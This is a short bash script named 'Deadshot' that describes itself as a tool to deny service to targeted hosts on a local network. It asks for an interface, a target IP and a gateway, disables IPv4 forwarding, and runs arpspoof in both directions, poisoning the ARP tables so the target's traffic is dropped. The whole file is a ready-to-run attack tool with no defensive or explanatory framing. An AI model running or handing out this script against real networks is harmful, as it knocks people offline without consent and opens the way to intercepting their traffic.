#!/bin/bash
echo "______                   _       _             _   ";
echo "|  _  \                 | |     | |           | |  ";
echo "| | | |  ___   __ _   __| | ___ | |__    ___ _| |__ ";
echo "| | | | / _ \ / _\` | / _\` |/ __|| '_ \  / _ \ | __|";
echo "| |/ / |  __/| (_| || (_| |\__ \| | | || (_) || |_ ";
echo "|___/   \___| \__,_| \__,_||___/|_| |_| \___/  \__|";
echo #                                                                                                 
echo  Deny service to targeted hosts.
echo  Enter the interface to listen on, the host IP address, and
echo  their gateway. You must have arpspoof installed. IPv4 forwarding
echo  will be disabled.
echo #
if [ "$(id -u)" -ne 0 ]; then
        echo 'This script must be run by root.' >&2
        exit 1
fi

#The script takes the input for the interface, target, and router.
read -p "[Deadshot] Enter the name of the inteface you're listening on: " interface
echo #
echo "[Deadshot] Listening on interface" $interface
echo #
read -p "[Deadshot] Enter the target's IPv4 address: " target
echo #
echo "[Deadshot] Target's IP: $target"
echo #
read -p "[Deadshot] Enter the ARP table's host address (Router): " host
echo #
echo "[Deadshot] Target's Gateway: $host" 
echo #
echo "[Deadshot] Checking for dependencies..."
wait

#if else statement for arpspoof 
if command -v arpspoof >/dev/null 2>&1 ; then
    echo "[Deadshot] arpspoof found..."
else
    echo "[Deadshot] arpspoof not found. You can install arpspoof with 'sudo apt-get install dsniff'."
	exit 1
fi
echo "[Deadshot] Disabling IPv4 forwarding..."
wait

#disabling IPv4 forwarding
echo "0" >> /proc/sys/net/ipv4/ip_forward
wait
echo "[Deadshot] Lights out, $target."
wait
echo #
arpspoof -i $interface -t $target -r $host
wait 
arpspoof -i $interface -t $host -r $target
wait